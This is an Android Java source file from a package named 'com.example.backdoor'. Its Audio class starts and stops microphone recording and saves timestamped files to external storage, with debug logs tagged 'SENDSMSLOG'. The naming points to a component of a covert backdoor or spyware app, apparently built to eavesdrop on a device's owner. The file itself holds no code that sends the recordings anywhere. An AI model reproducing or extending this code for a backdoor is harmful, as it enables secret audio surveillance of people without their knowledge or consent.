package com.example.backdoor;

import java.io.File;

import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Log;

public class Audio {
	private MediaRecorder recorder=null ;
	private int audioformat=MediaRecorder.OutputFormat.THREE_GPP;
	private String fileextn =".mp4";
	 String path;
	 File file;
	 
	 Audio(){
		 
	 }
	public void startRecording()
	{Log.d("SENDSMSLOG","start Record functionn");
		 recorder = new MediaRecorder();
		Log.d("SENDSMSLOG","1");
		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
		Log.d("SENDSMSLOG","2");
		recorder.setOutputFormat(audioformat);
		Log.d("SENDSMSLOG","3");
		recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
		Log.d("SENDSMSLOG","file Record functionn");
		recorder.setAudioEncodingBitRate(256);
		recorder.setAudioSamplingRate(44100);
		path = getFilePath();
		recorder.setOutputFile(path);
	try{
		recorder.prepare();
		recorder.start();
	}catch(Exception e){
		e.printStackTrace();
		
	}
	Log.d("SENDSMSLOG","end start Record functionn");
	}
	public void stopRecording(){
		Log.d("SENDSMSLOG","stop Record functionn:"+ recorder);
		if(recorder != null)
		{
		Log.d("SENDSMSLOG","stop0000");

		recorder.stop();
		Log.d("SENDSMSLOG","stop1");
		recorder.reset();
		recorder.release();
        recorder=null;		
        Log.d("SENDSMSLOG","stop Record functionn end");
		}
		Log.d("SENDSMSLOG","not stop Record functionn end");
	}
	private String getFilePath()
	{
		String filePath=Environment.getExternalStorageDirectory().getPath();
		file= new File(filePath,"MediaRecorder");
	if(!file.exists())
		file.mkdirs();
	return(file.getAbsolutePath()+"/"+System.currentTimeMillis()+fileextn);
	}

}